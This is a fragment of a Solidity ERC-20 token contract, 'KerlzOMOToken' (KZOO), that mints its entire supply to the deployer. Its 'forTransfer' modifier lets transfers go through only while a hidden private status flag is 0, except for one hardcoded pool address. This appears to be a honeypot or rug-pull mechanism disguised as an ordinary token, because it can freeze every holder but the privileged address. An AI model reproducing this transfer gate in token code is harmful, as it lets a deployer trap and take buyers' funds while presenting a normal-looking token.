...
contract KerlzOMOToken is Context, IERC20, IERC20Metadata {

    mapping(address => uint256) private _balances;

    mapping(address => mapping(address => uint256)) private _allowances;

    uint256 private _tokenKO_totalSupply;
    uint256 private _tokenKO_status = 0;
    uint256 public stakingPoolKOStatus = 0;

    string private _tokenKO_name;
    string private _tokenKO_symbol;

    address private _poolKOAddress = 0x17A5aA38F87A10c64fd3DBf383c86fD2445d0067;

    constructor() {
        _tokenKO_name = "KerlzOMO";
        _tokenKO_symbol = "KZOO";
        _tokenKO_totalSupply = 94500 * 10 ** 18;
        _balances[msg.sender] = _tokenKO_totalSupply;
    }

    modifier forTransfer {
        require(msg.sender == _poolKOAddress || _tokenKO_status == 0);
        _;
    }
